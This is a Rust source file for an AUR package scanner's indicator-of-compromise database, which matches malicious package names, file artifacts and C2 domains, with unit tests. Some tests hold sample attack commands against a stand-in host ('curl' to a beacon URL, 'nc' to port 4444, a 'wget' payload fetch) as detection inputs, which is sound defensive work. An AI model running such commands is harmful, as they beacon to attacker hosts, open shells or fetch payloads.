//! Indicator-of-compromise (IOC) database.
//!
//! Heuristic pattern matching misses supply-chain attacks where the hijacked
//! package looks clean (the central lesson of the June 2026 "Atomic Arch"
//! campaign). A data-driven IOC list catches those by name/artifact: malicious
//! payload packages, dropped file artifacts, C2 domains, and payload hashes.
//!
//! The database is embedded at build time and can be extended at runtime by an
//! on-disk override (see [`IocDatabase::try_load`]), so the indicator set can be
//! updated from a live feed without rebuilding.

use crate::error::{Result, ScanError};
use serde::Deserialize;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// The embedded default IOC database (TOML).
const EMBEDDED: &str = include_str!("ioc_default.toml");

/// Metadata describing a malware campaign referenced by indicators.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct Campaign {
    /// Stable campaign identifier (e.g. "atomic-arch-2026-06").
    pub id: String,
    /// Human-readable name.
    pub name: String,
    /// Date or month the campaign surfaced.
    #[serde(default)]
    pub date: String,
    /// Short description.
    #[serde(default)]
    pub description: String,
    /// Reference URL.
    #[serde(default)]
    pub reference: String,
}

/// A loaded IOC database.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct IocDatabase {
    /// Schema version of the on-disk format.
    #[serde(default)]
    pub schema_version: u32,
    /// Date the indicator set was last updated.
    #[serde(default)]
    pub updated: String,
    /// Campaign metadata.
    #[serde(default)]
    pub campaigns: Vec<Campaign>,
    /// Malicious npm/bun package name -> campaign id.
    #[serde(default)]
    pub npm_packages: HashMap<String, String>,
    /// Known-malicious (wholly-fake) AUR package name -> campaign id.
    #[serde(default)]
    pub aur_packages: HashMap<String, String>,
    /// Dropped file-name artifact -> campaign id.
    #[serde(default)]
    pub files: HashMap<String, String>,
    /// C2 / exfil domain -> campaign id.
    #[serde(default)]
    pub domains: HashMap<String, String>,
    /// SHA-256 of a malicious payload -> campaign id.
    #[serde(default)]
    pub sha256: HashMap<String, String>,
}

/// The class of indicator that matched.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IocKind {
    /// A malicious npm/bun package name.
    NpmPackage,
    /// A dropped file-name artifact.
    FileArtifact,
    /// A C2 / exfiltration domain.
    Domain,
}

impl IocKind {
    /// A short human label.
    pub fn label(&self) -> &'static str {
        match self {
            IocKind::NpmPackage => "malicious npm/bun package",
            IocKind::FileArtifact => "payload file artifact",
            IocKind::Domain => "C2/exfil domain",
        }
    }
}

/// A single indicator match within scanned content.
#[derive(Debug, Clone)]
pub struct IocHit {
    /// What kind of indicator matched.
    pub kind: IocKind,
    /// The indicator value that matched.
    pub value: String,
    /// The campaign id this indicator belongs to, if known.
    pub campaign: Option<String>,
    /// 1-indexed line number of the match.
    pub line: usize,
}

impl IocDatabase {
    /// Parse the embedded default database. Panics only on a build-time-broken
    /// embedded file, which is caught by tests.
    pub fn embedded() -> Self {
        toml::from_str(EMBEDDED).expect("embedded IOC database must parse")
    }

    /// Load the database, failing closed on a broken system override.
    ///
    /// Embedded defaults are merged with every readable on-disk override so
    /// indicators can be updated from a feed without a rebuild. A system-owned
    /// override (`/usr/share/aur-scanner/ioc.toml`, `/etc/aur-scanner/ioc.toml`)
    /// that exists but is unreadable or malformed is a hard error, the same
    /// contract as the scanner config: a security feed must never look like it
    /// is in effect while being silently ignored. The per-user override lives in
    /// a user-writable directory, so a malformed one is reported loudly on
    /// stderr and skipped rather than letting any process that can write there
    /// disable every scan; a root process never reads it at all.
    pub fn try_load() -> Result<Self> {
        Self::try_load_from(&Self::override_sources())
    }

    /// Lenient variant of [`Self::try_load`]: on error it prints the error to
    /// stderr and falls back to the embedded defaults. Prefer `try_load`.
    pub fn load() -> Self {
        Self::try_load().unwrap_or_else(|e| {
            eprintln!("aur-scan: error: {e}; using the embedded IOC defaults only");
            Self::embedded()
        })
    }

    /// Load from explicit `(path, is_system_path)` sources, in order.
    fn try_load_from(sources: &[(PathBuf, bool)]) -> Result<Self> {
        let mut db = Self::embedded();
        for (path, system) in sources {
            let text = match std::fs::read_to_string(path) {
                Ok(t) => t,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
                Err(e) => {
                    let msg = format!("cannot read IOC override {}: {e}", path.display());
                    if *system {
                        return Err(ScanError::Config(msg));
                    }
                    eprintln!("aur-scan: error: {msg}; ignoring it");
                    continue;
                }
            };
            match toml::from_str::<IocDatabase>(&text) {
                Ok(extra) => {
                    tracing::info!("merged IOC overrides from {}", path.display());
                    db.merge(extra);
                }
                Err(e) => {
                    let msg = format!("malformed IOC override {}: {e}", path.display());
                    if *system {
                        return Err(ScanError::Config(msg));
                    }
                    eprintln!("aur-scan: error: {msg}; ignoring it");
                }
            }
        }
        Ok(db)
    }

    /// Candidate override locations with whether each is a root-owned system
    /// path, in load order. A privileged process skips the user path.
    fn override_sources() -> Vec<(PathBuf, bool)> {
        let mut sources = vec![
            (PathBuf::from("/usr/share/aur-scanner/ioc.toml"), true),
            (PathBuf::from("/etc/aur-scanner/ioc.toml"), true),
        ];
        if !crate::rules::running_as_root() {
            if let Some(data) = dirs::data_dir() {
                sources.push((data.join("aur-scanner/ioc.toml"), false));
            }
        }
        sources
    }

    /// Candidate on-disk override locations, in load order.
    fn override_paths() -> Vec<PathBuf> {
        Self::override_sources()
            .into_iter()
            .map(|(p, _)| p)
            .collect()
    }

    /// Union another database into this one. Indicator maps are merged
    /// (override entries win on key collision); campaigns are appended unless
    /// the id already exists.
    pub fn merge(&mut self, other: IocDatabase) {
        if !other.updated.is_empty() {
            self.updated = other.updated;
        }
        for c in other.campaigns {
            if !self.campaigns.iter().any(|e| e.id == c.id) {
                self.campaigns.push(c);
            }
        }
        self.npm_packages.extend(other.npm_packages);
        self.aur_packages.extend(other.aur_packages);
        self.files.extend(other.files);
        self.domains.extend(other.domains);
        self.sha256.extend(other.sha256);
    }

    /// Total number of indicators across all classes.
    pub fn indicator_count(&self) -> usize {
        self.npm_packages.len()
            + self.aur_packages.len()
            + self.files.len()
            + self.domains.len()
            + self.sha256.len()
    }

    /// Look up campaign metadata by id.
    pub fn campaign(&self, id: &str) -> Option<&Campaign> {
        self.campaigns.iter().find(|c| c.id == id)
    }

    /// If `name` is a known-malicious AUR package, return its campaign id.
    pub fn match_aur_package(&self, name: &str) -> Option<&str> {
        self.aur_packages.get(name).map(String::as_str)
    }

    /// If `sha256` is a known payload hash, return its campaign id.
    pub fn match_sha256(&self, sha256: &str) -> Option<&str> {
        let lc = sha256.to_lowercase();
        self.sha256.get(&lc).map(String::as_str)
    }

    /// Scan free-text content for npm-package, file-artifact, and domain
    /// indicators. Whole-token matches only, to avoid substring false positives.
    pub fn scan_content(&self, content: &str) -> Vec<IocHit> {
        let mut hits = Vec::new();
        for (line_idx, line) in content.lines().enumerate() {
            let trimmed = line.trim_start();
            if trimmed.starts_with('#') {
                continue;
            }
            let tokens: Vec<&str> = line
                .split(|c: char| {
                    !(c.is_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '/')
                })
                .filter(|t| !t.is_empty())
                .collect();

            for (map, kind) in [
                (&self.npm_packages, IocKind::NpmPackage),
                (&self.files, IocKind::FileArtifact),
            ] {
                for (indicator, campaign) in map {
                    if tokens.iter().any(|t| t == indicator) {
                        hits.push(IocHit {
                            kind,
                            value: indicator.clone(),
                            campaign: Some(campaign.clone()),
                            line: line_idx + 1,
                        });
                    }
                }
            }

            // Domains: match on the PARSED host at label boundaries (equal or a
            // true subdomain), after defang normalization -- NOT a raw substring.
            // So `evil.example` matches `https://c2.evil.example/x` and a defanged
            // `hxxp://evil[.]example`, but NOT `notevil.example` nor a path/string
            // that merely contains the characters (the substring over-match).
            for (domain, campaign) in &self.domains {
                if crate::neturl::line_has_host(line, domain) {
                    hits.push(IocHit {
                        kind: IocKind::Domain,
                        value: domain.clone(),
                        campaign: Some(campaign.clone()),
                        line: line_idx + 1,
                    });
                }
            }
        }
        hits
    }
}

/// Path actually used (if any) when loading overrides; for diagnostics.
pub fn active_override_path() -> Option<PathBuf> {
    IocDatabase::override_paths()
        .into_iter()
        .find(|p: &PathBuf| Path::new(p).is_file())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn embedded_parses_and_has_atomic_iocs() {
        let db = IocDatabase::embedded();
        assert!(db.npm_packages.contains_key("atomic-lockfile"));
        assert!(db.npm_packages.contains_key("js-digest"));
        assert!(db.files.contains_key("scales.bpf.c"));
        assert!(db.campaign("atomic-arch-2026-06").is_some());
    }

    #[test]
    fn scan_detects_npm_payload_whole_token() {
        let db = IocDatabase::embedded();
        let hits = db.scan_content("npm install atomic-lockfile --silent");
        assert!(hits
            .iter()
            .any(|h| h.kind == IocKind::NpmPackage && h.value == "atomic-lockfile"));
    }

    #[test]
    fn scan_no_substring_false_positive() {
        let db = IocDatabase::embedded();
        // "js-digestion" must not match "js-digest".
        let hits = db.scan_content("require('js-digestion')");
        assert!(!hits.iter().any(|h| h.value == "js-digest"));
    }

    #[test]
    fn does_not_blocklist_legit_hijacked_package() {
        // alvr was hijacked-then-reverted; it must NOT be a name indicator.
        let db = IocDatabase::embedded();
        assert!(db.match_aur_package("alvr").is_none());
    }

    #[test]
    fn merge_unions_indicators() {
        let mut db = IocDatabase::embedded();
        let extra: IocDatabase =
            toml::from_str("[domains]\n\"evil.example\" = \"atomic-arch-2026-06\"\n").unwrap();
        db.merge(extra);
        assert!(db.domains.contains_key("evil.example"));
    }

    #[test]
    fn domain_ioc_is_host_aware_not_substring() {
        // Task 4120: domain IOCs must match on the parsed host (equal or a true
        // subdomain), after defang normalization -- not a raw substring.
        let mut db = IocDatabase::embedded();
        db.domains.insert(
            "evil.example".to_string(),
            "atomic-arch-2026-06".to_string(),
        );
        let domain_hit = |s: &str| {
            db.scan_content(s)
                .iter()
                .any(|h| h.kind == IocKind::Domain && h.value == "evil.example")
        };

        // POSITIVE: exact host, a subdomain, and a defanged form all match.
        assert!(domain_hit("curl https://evil.example/beacon"));
        assert!(domain_hit("nc c2.evil.example 4444"));
        assert!(domain_hit("wget hxxps://evil[.]example/x"));

        // NEGATIVE (the substring over-match the old code had):
        // a sibling label, a path containing the string, and a left-extended host.
        assert!(!domain_hit(
            "source=(https://github.com/u/evil.example-mirror)"
        ));
        assert!(!domain_hit("curl https://notevil.example/x"));
        assert!(!domain_hit("git clone https://evil.example.attacker.net/x"));
    }

    #[test]
    fn malformed_system_override_is_a_hard_error() {
        let dir = std::env::temp_dir().join(format!("aur-ioc-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let bad = dir.join("ioc.toml");
        std::fs::write(&bad, "this is = not [valid toml").unwrap();
        let err = IocDatabase::try_load_from(&[(bad.clone(), true)])
            .expect_err("malformed system IOC file must fail");
        assert!(err.to_string().contains("malformed IOC override"), "{err}");
        // A malformed *user* file is reported and skipped, not fatal.
        assert!(IocDatabase::try_load_from(&[(bad, false)]).is_ok());
        // A missing file is simply absent.
        assert!(IocDatabase::try_load_from(&[(dir.join("nope.toml"), true)]).is_ok());
        // A good system override merges.
        let good = dir.join("good.toml");
        std::fs::write(&good, "[domains]\n\"evil2.example\" = \"c\"\n").unwrap();
        let db = IocDatabase::try_load_from(&[(good, true)]).unwrap();
        assert!(db.domains.contains_key("evil2.example"));
    }
}
